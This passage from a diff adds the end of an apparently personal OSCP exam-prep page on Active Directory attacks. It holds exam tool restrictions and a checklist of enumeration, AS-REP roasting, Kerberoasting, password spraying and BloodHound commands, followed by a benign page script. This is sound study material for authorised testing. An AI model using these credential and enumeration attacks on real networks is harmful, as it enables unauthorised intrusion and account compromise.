+<td>Do not persist across engagements; note in report</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Document every modification</strong> — the OSCP report must list every account touched and confirm cleanup.</p>
+<hr />
+<h2 id="exam-restrictions">EXAM Restrictions</h2>
+<p><strong>BANNED:</strong></p>
+<ul>
+<li><strong>Responder poisoning</strong> — active answering of LLMNR/NBT-NS/mDNS. Only analyse-only <code>-A</code> is EXAM-OK.</li>
+<li><strong>All spoofing</strong> — ARP / DNS / NBNS / LLMNR / mDNS.</li>
+</ul>
+<p><strong>RESTRICTED — one target only:</strong></p>
+<ul>
+<li><strong>Metasploit exploit / auxiliary / post modules</strong> for anything except <code>multi/handler</code>.</li>
+<li><strong>Meterpreter payloads.</strong></li>
+<li>Prefer impacket + evil-winrm + nxc + BloodHound + Rubeus.</li>
+</ul>
+<p><strong>Every banned tool has a manual EXAM-OK path</strong> — see the individual technique notes.</p>
+<hr />
+<h2 id="exam-day-ad-checklist">EXAM-Day AD Checklist</h2>
+<p><strong>From zero (no cred):</strong></p>
+<ul>
+<li>[ ] Full port scan on DC — confirm DC signature (88+389+636+445)</li>
+<li>[ ] <code>enum4linux-ng -A &lt;DC_IP&gt;</code></li>
+<li>[ ] <code>nxc smb -u '' -p '' --rid-brute</code> and <code>-u guest -p ''</code> fallback</li>
+<li>[ ] Anon LDAP <code>-b '' namingContexts</code></li>
+<li>[ ] AS-REP roast with <code>-no-pass</code> (from any username list)</li>
+<li>[ ] <code>kerbrute userenum</code> after any username list built (username-anarchy on scraped names)</li>
+</ul>
+<p><strong>With one cred:</strong></p>
+<ul>
+<li>[ ] BloodHound collection (<code>bloodhound-ce-python -c All</code>)</li>
+<li>[ ] Password policy check (<code>--pass-pol</code>)</li>
+<li>[ ] LAPS check (<code>nxc ldap -M laps</code>)</li>
+<li>[ ] <code>--continue-on-success</code> on any spray (netexec <code>--gfail-limit</code> / <code>--ufail-limit</code>)</li>
+<li>[ ] Kerberoast if any SPN</li>
+<li>[ ] Description/info field grep on all users</li>
+<li>[ ] Mark cred as Owned in BloodHound; recompute paths</li>
+</ul>
+<p><strong>Per BloodHound edge:</strong></p>
+<ul>
+<li>[ ] Read edge details in BloodHound before executing</li>
+<li>[ ] Note cleanup command BEFORE executing</li>
+<li>[ ] Execute</li>
+<li>[ ] <strong>Cleanup</strong> (add reminder to notes if not immediate)</li>
+<li>[ ] Recollect BloodHound after any cred/ACL change</li>
+</ul>
+<p><strong>Under exam time pressure:</strong></p>
+<ul>
+<li>[ ] Timebox 30 min per attempted path</li>
+<li>[ ] Don't try to Kerberoast a hash uncrackable in rockyou — move on</li>
+<li>[ ] Password reuse is the highest-ROI move; try it constantly</li>
+<li>[ ] Metasploit modules = one target only</li>
+<li>[ ] Responder = analyse only</li>
+</ul>
+  <p class="disclaimer">// For authorized engagements, lab environments, and exam prep only. Box names reference retired HTB CPTS / PG Practice targets used for study. Replace all placeholders with your own scoped values.</p>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — active-directory · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');a.scrollIntoView({block:'nearest',inline:'center'});}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
